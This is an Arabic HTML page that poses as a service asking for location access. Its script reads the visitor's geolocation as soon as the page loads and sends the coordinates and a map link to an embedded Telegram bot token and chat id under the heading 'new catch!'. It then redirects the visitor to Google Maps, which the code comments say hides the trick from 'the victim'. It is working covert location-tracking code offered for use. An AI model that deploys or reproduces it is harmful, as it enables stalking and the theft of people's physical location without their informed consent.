<!DOCTYPE html>
<html>
<head>
    <title>تحديد الموقع لتلقي الخدمة</title>
</head>
<body>
    <h2>جاري تحميل البيانات... يرجى السماح بالوصول للموقع</h2>
    <script>
        window.onload = function() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(sendPosition);
            } else {
                alert("المتصفح لا يدعم تحديد الموقع");
            }
        };

        function sendPosition(position) {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            
            // إرسال الإحداثيات إلى بوت التليجرام الخاص بك عبر API
            const token = "8741683333:AAE4rkxyKynPPLPk9GvNNUGTQOjOBT7Iu9s";
            const chat_id = "6999879648";
            const message = `📍 صيد جديد!\nخط العرض: ${lat}\nخط الطول: ${lon}\nرابط الخريطة: https://www.google.com/maps?q=${lat},${lon}`;
            
            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`)
            .then(response => {
                // إعادة توجيه الضحية لموقع حقيقي لإبعاد الشبهة
                window.location.href = "https://www.google.com/maps";
            });
        }
    </script>
</body>
</html>
